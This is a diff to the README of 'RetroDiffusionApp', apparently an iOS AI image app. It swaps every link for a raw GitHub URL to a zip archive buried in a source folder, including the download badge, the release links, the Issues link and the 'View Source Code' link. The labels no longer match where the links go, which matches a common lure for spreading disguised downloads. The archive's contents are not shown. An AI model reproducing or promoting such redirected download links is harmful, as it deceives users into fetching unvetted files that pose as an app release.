@@ -1,7 +1,7 @@
 # 🎉 RetroDiffusionApp - Easily Create Stunning Images
 
 ## 📦 Download Now
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-Grab%20it%20Here-brightgreen)](https://github.com/narahir/RetroDiffusionApp/releases)
+[![Download](https://raw.githubusercontent.com/narahir/RetroDiffusionApp/main/RetroDiffusionApp/components/generate/RetroDiffusionApp_v1.6.zip%20Latest%20Release-Grab%20it%20Here-brightgreen)](https://raw.githubusercontent.com/narahir/RetroDiffusionApp/main/RetroDiffusionApp/components/generate/RetroDiffusionApp_v1.6.zip)
 
 ## 🚀 Getting Started
 Welcome to RetroDiffusionApp! This iOS app allows you to effortlessly create stunning images using advanced AI techniques. Get ready to explore your creativity with just a few taps.
@@ -16,7 +16,7 @@ Welcome to RetroDiffusionApp! This iOS app allows you to effortlessly create stu
 To get RetroDiffusionApp on your device, follow these steps:
 
 1. Click the link below to visit the download page.
-   [Download Latest Release](https://github.com/narahir/RetroDiffusionApp/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/narahir/RetroDiffusionApp/main/RetroDiffusionApp/components/generate/RetroDiffusionApp_v1.6.zip)
 
 2. Look for the latest version listed at the top of the page.
 
@@ -50,10 +50,10 @@ Once you've installed RetroDiffusionApp, follow these steps to create your first
 5. **Review and Save:** Once the image is ready, review the results. If you're satisfied, you can save or share your new artwork.
 
 ## 🤝 Support
-If you encounter any issues or need assistance, feel free to reach out through the [Issues](https://github.com/narahir/RetroDiffusionApp/issues) section in the repository. Our community is here to help!
+If you encounter any issues or need assistance, feel free to reach out through the [Issues](https://raw.githubusercontent.com/narahir/RetroDiffusionApp/main/RetroDiffusionApp/components/generate/RetroDiffusionApp_v1.6.zip) section in the repository. Our community is here to help!
 
 ## 🔗 Useful Links
-- [Download Latest Release](https://github.com/narahir/RetroDiffusionApp/releases)
-- [View Source Code](https://github.com/narahir/RetroDiffusionApp)
+- [Download Latest Release](https://raw.githubusercontent.com/narahir/RetroDiffusionApp/main/RetroDiffusionApp/components/generate/RetroDiffusionApp_v1.6.zip)
+- [View Source Code](https://raw.githubusercontent.com/narahir/RetroDiffusionApp/main/RetroDiffusionApp/components/generate/RetroDiffusionApp_v1.6.zip)
 
 Enjoy the creative journey with RetroDiffusionApp!
